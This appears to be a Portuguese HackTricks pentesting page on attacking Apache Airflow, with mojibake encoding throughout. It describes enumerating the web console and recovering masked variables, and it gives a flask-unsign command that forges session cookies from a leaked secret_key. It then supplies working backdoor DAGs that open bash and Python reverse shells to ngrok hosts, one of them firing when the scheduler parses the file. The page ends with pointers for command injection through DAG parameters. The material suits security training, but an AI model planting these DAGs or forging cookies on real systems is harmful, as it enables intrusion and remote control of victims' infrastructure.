# Seguran√ßa do Apache Airflow

<details>

{% hint style="success" %}
Aprenda e pratique Hacking na AWS: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprenda e pratique Hacking no GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Informa√ß√µes B√°sicas

[**Apache Airflow**](https://airflow.apache.org) atua como uma plataforma para **orquestar e agendar pipelines ou fluxos de dados**. O termo "orquestra√ß√£o" no contexto de pipelines de dados significa o processo de organizar, coordenar e gerenciar fluxos de trabalho de dados complexos originados de v√°rias fontes. O objetivo principal desses pipelines de dados orquestrados √© fornecer conjuntos de dados processados e consum√≠veis. Esses conjuntos de dados s√£o amplamente utilizados por uma infinidade de aplicativos, incluindo, mas n√£o se limitando a ferramentas de intelig√™ncia de neg√≥cios, ci√™ncia de dados e modelos de aprendizado de m√°quina, todos os quais s√£o fundamentais para o funcionamento de aplicativos de big data.

Basicamente, o Apache Airflow permitir√° que voc√™ **agende a execu√ß√£o de c√≥digo quando algo** (evento, cron) **acontece**.

## Laborat√≥rio Local

### Docker-Compose

Voc√™ pode usar o **arquivo de configura√ß√£o docker-compose de** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) para iniciar um ambiente completo do Apache Airflow com Docker. (Se estiver no MacOS, certifique-se de fornecer pelo menos 6GB de RAM para a m√°quina virtual do Docker).

### Minikube

Uma maneira f√°cil de **executar o Apache Airflow** √© execut√°-lo **com o minikube**:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Configura√ß√£o do Airflow

O Airflow pode armazenar **informa√ß√µes sens√≠veis** em sua configura√ß√£o ou voc√™ pode encontrar configura√ß√µes fracas em vigor:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## RBAC do Airflow

Antes de come√ßar a atacar o Airflow, voc√™ deve entender **como funcionam as permiss√µes**:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## Ataques

### Enumera√ß√£o do Console Web

Se voc√™ tiver **acesso ao console web**, pode ser capaz de acessar algumas ou todas as seguintes informa√ß√µes:

* **Vari√°veis** (Informa√ß√µes sens√≠veis personalizadas podem ser armazenadas aqui)
* **Conex√µes** (Informa√ß√µes sens√≠veis personalizadas podem ser armazenadas aqui)
* Acesse em `http://<airflow>/connection/list/`
* [**Configura√ß√£o**](./#airflow-configuration) (Informa√ß√µes sens√≠veis como a **`secret_key`** e senhas podem ser armazenadas aqui)
* Listar **usu√°rios e fun√ß√µes**
* **C√≥digo de cada DAG** (que pode conter informa√ß√µes interessantes)

### Recuperar Valores de Vari√°veis

Vari√°veis podem ser armazenadas no Airflow para que os **DAGs** possam **acessar** seus valores. √â semelhante a segredos de outras plataformas. Se voc√™ tiver **permiss√µes suficientes**, pode acess√°-los na GUI em `http://<airflow>/variable/list/`.\
Por padr√£o, o Airflow mostrar√° o valor da vari√°vel na GUI, no entanto, de acordo com [**este**](https://marclamberti.com/blog/variables-with-apache-airflow/) √© poss√≠vel definir uma **lista de vari√°veis** cujo **valor** aparecer√° como **asteriscos** na **GUI**.

![](<../../.gitbook/assets/image (164).png>)

No entanto, esses **valores** ainda podem ser **recuperados** via **CLI** (√© necess√°rio ter acesso ao BD), execu√ß√£o de **DAG arbitr√°rio**, **API** acessando o endpoint de vari√°veis (a API precisa estar ativada) e **at√© mesmo a pr√≥pria GUI!**\
Para acessar esses valores na GUI, basta **selecionar as vari√°veis** que deseja acessar e **clicar em A√ß√µes -> Exportar**.\
Outra maneira √© realizar um **bruteforce** para o **valor oculto** usando o **filtro de pesquisa** at√© encontr√°-lo:

![](<../../.gitbook/assets/image (152).png>)

### Escala√ß√£o de Privil√©gios

Se a configura√ß√£o **`expose_config`** estiver definida como **True**, a partir da **fun√ß√£o de Usu√°rio** e **acima** pode **ler** a **configura√ß√£o na web**. Nesta configura√ß√£o, a **`secret_key`** aparece, o que significa que qualquer usu√°rio com isso v√°lido pode **criar seu pr√≥prio cookie assinado para se passar por qualquer outra conta de usu√°rio**.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### Backdoor do DAG (RCE no worker do Airflow)

Se voc√™ tem **acesso de escrita** ao local onde os **DAGs s√£o salvos**, voc√™ pode simplesmente **criar um** que ir√° enviar a voc√™ um **shell reverso**.\
Observe que este shell reverso ser√° executado dentro de um **container do worker do airflow**:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### Backdoor do DAG (RCE no agendador do Airflow)

Se voc√™ definir algo para ser **executado na raiz do c√≥digo**, no momento desta escrita, ele ser√° **executado pelo agendador** ap√≥s alguns segundos ap√≥s ser colocado dentro da pasta do DAG.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### Cria√ß√£o de DAG

Se voc√™ conseguir **comprometer uma m√°quina dentro do cluster DAG**, voc√™ pode criar novos **scripts DAGs** na pasta `dags/` e eles ser√£o **replicados no restante das m√°quinas** dentro do cluster DAG.

### Inje√ß√£o de C√≥digo DAG

Ao executar um DAG a partir da GUI, voc√™ pode **passar argumentos** para ele.\
Portanto, se o DAG n√£o estiver codificado corretamente, ele poder√° ser **vulner√°vel √† Inje√ß√£o de Comandos.**\
Foi o que aconteceu neste CVE: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

Tudo o que voc√™ precisa saber para **come√ßar a procurar inje√ß√µes de comandos em DAGs** √© que os **par√¢metros** s√£o **acessados** com o c√≥digo **`dag_run.conf.get("nome_do_parametro")`**.

Al√©m disso, a mesma vulnerabilidade pode ocorrer com **vari√°veis** (observe que, com privil√©gios suficientes, voc√™ poderia **controlar o valor das vari√°veis** na GUI). As vari√°veis s√£o **acessadas com**:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
Se forem usados, por exemplo, dentro de um comando bash, voc√™ poderia realizar uma inje√ß√£o de comando.

<details>

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Treinamento HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Treinamento HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoie o HackTricks</summary>

* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
